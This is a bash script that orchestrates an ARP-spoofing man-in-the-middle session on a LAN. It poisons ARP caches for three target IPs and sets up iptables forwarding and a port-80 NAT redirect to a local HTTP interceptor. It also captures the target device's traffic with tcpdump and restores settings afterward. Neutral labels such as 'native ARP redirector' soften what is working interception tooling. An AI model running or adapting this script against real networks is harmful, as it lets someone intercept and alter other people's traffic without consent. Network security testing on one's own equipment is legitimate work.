#!/usr/bin/env bash
# NET-CONFIG-005: Multi-Endpoint HTTP Server & Interceptor Session Runner
set -euo pipefail

IFACE="enp5s0"
TARGET_IPS=("192.168.1.138" "192.168.1.137" "192.168.1.134")
TARGET_MAC="68:15:90:6b:81:96"
GATEWAY_IP="192.168.1.1"
HTTP_PORT="8080"
DURATION="${1:-300}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_DIR="$(cd "${SCRIPT_DIR}/.." && pwd)"
CAPTURES_DIR="${REPO_DIR}/captures"
mkdir -p "${CAPTURES_DIR}"

PCAP_FILE="${CAPTURES_DIR}/net-config-005.pcap"
HTTP_LOG="${CAPTURES_DIR}/net-config-005.log"
INTERCEPTOR_STDOUT="${CAPTURES_DIR}/http_interceptor_config005.log"
ARP_LOG="${CAPTURES_DIR}/arp_spoofer_config005.log"

ORIG_REDIRECT_ALL="$(sysctl -n net.ipv4.conf.all.send_redirects)"
ORIG_REDIRECT_IF="$(sysctl -n net.ipv4.conf.${IFACE}.send_redirects)"

echo "[+] Target MAC: ${TARGET_MAC} (IPs: ${TARGET_IPS[*]})"
echo "[+] Gateway: ${GATEWAY_IP}"
echo "[+] Interface: ${IFACE}"
echo "[+] HTTP Interceptor Port: ${HTTP_PORT}"
echo "[+] HTTP Log File: ${HTTP_LOG}"
echo "[+] PCAP File: ${PCAP_FILE}"

CLEANED_UP=0
cleanup() {
    if [ "$CLEANED_UP" -eq 1 ]; then
        return
    fi
    CLEANED_UP=1
    echo "[*] Cleaning up session..."

    if [ -n "${HTTP_PID:-}" ] && kill -0 "${HTTP_PID}" 2>/dev/null; then
        echo "[*] Stopping HTTP interceptor..."
        kill -TERM "${HTTP_PID}" 2>/dev/null || true
        wait "${HTTP_PID}" 2>/dev/null || true
    fi

    if [ -n "${ARP_PID:-}" ] && kill -0 "${ARP_PID}" 2>/dev/null; then
        echo "[*] Stopping native ARP redirector (restoring ARP tables)..."
        kill -TERM "${ARP_PID}" 2>/dev/null || true
        wait "${ARP_PID}" 2>/dev/null || true
    fi

    if [ -n "${TCPDUMP_PID:-}" ] && kill -0 "${TCPDUMP_PID}" 2>/dev/null; then
        echo "[*] Terminating tcpdump..."
        kill -TERM "${TCPDUMP_PID}" 2>/dev/null || true
        wait "${TCPDUMP_PID}" 2>/dev/null || true
    fi

    echo "[*] Removing iptables NAT redirect..."
    iptables -t nat -D PREROUTING -i "${IFACE}" -m mac --mac-source "${TARGET_MAC}" -p tcp --dport 80 -j REDIRECT --to-ports "${HTTP_PORT}" 2>/dev/null || true

    echo "[*] Removing temporary FORWARD rules..."
    for tip in "${TARGET_IPS[@]}"; do
        iptables -D FORWARD -i "${IFACE}" -o "${IFACE}" -s "${tip}" -j ACCEPT 2>/dev/null || true
        iptables -D FORWARD -i "${IFACE}" -o "${IFACE}" -d "${tip}" -j ACCEPT 2>/dev/null || true
    done

    echo "[*] Restoring sysctl redirect settings..."
    sysctl -w "net.ipv4.conf.all.send_redirects=${ORIG_REDIRECT_ALL}" >/dev/null
    sysctl -w "net.ipv4.conf.${IFACE}.send_redirects=${ORIG_REDIRECT_IF}" >/dev/null

    echo "[+] Cleanup complete. Current forward rules:"
    iptables -S FORWARD
}

trap cleanup EXIT INT TERM

echo "[+] Suppressing kernel ICMP redirects..."
sysctl -w net.ipv4.conf.all.send_redirects=0 >/dev/null
sysctl -w "net.ipv4.conf.${IFACE}.send_redirects=0" >/dev/null

echo "[+] Inserting targeted FORWARD rules..."
for tip in "${TARGET_IPS[@]}"; do
    iptables -I FORWARD 1 -i "${IFACE}" -o "${IFACE}" -s "${tip}" -j ACCEPT
    iptables -I FORWARD 2 -i "${IFACE}" -o "${IFACE}" -d "${tip}" -j ACCEPT
done

echo "[+] Inserting port 80 NAT REDIRECT rule..."
iptables -t nat -I PREROUTING 1 -i "${IFACE}" -m mac --mac-source "${TARGET_MAC}" -p tcp --dport 80 -j REDIRECT --to-ports "${HTTP_PORT}"

echo "[+] Starting HTTP interceptor on port ${HTTP_PORT}..."
python3 -u "${SCRIPT_DIR}/http_interceptor.py" "${HTTP_PORT}" "${HTTP_LOG}" > "${INTERCEPTOR_STDOUT}" 2>&1 &
HTTP_PID=$!
sleep 1

if ! kill -0 "${HTTP_PID}" 2>/dev/null; then
    echo "[-] Error: HTTP interceptor failed to start"
    exit 1
fi
echo "[+] HTTP interceptor active (PID ${HTTP_PID})"

echo "[+] Starting tcpdump..."
tcpdump -i "${IFACE}" -s 0 -nn -U -w "${PCAP_FILE}" \
    "ether host ${TARGET_MAC}" >/dev/null 2>&1 &
TCPDUMP_PID=$!
sleep 1

if ! kill -0 "${TCPDUMP_PID}" 2>/dev/null; then
    echo "[-] Error: tcpdump failed to start"
    exit 1
fi
echo "[+] tcpdump active (PID ${TCPDUMP_PID})"

echo "[+] Starting native ARP redirector..."
TARGETS_CSV="$(IFS=,; echo "${TARGET_IPS[*]}")"
python3 "${SCRIPT_DIR}/arp_spoofer.py" "${IFACE}" "${TARGETS_CSV}" "${TARGET_MAC}" "${GATEWAY_IP}" > "${ARP_LOG}" 2>&1 &
ARP_PID=$!
sleep 1

if ! kill -0 "${ARP_PID}" 2>/dev/null; then
    echo "[-] Error: ARP redirector failed to start"
    exit 1
fi
echo "[+] ARP redirector active (PID ${ARP_PID})"
echo "[+] NET-CONFIG-005 is ACTIVE. Bounded duration: ${DURATION} seconds."
echo "[+] Ready for receiver diagnostic / boot execution."

sleep "${DURATION}"
echo "[+] Bounded duration reached."
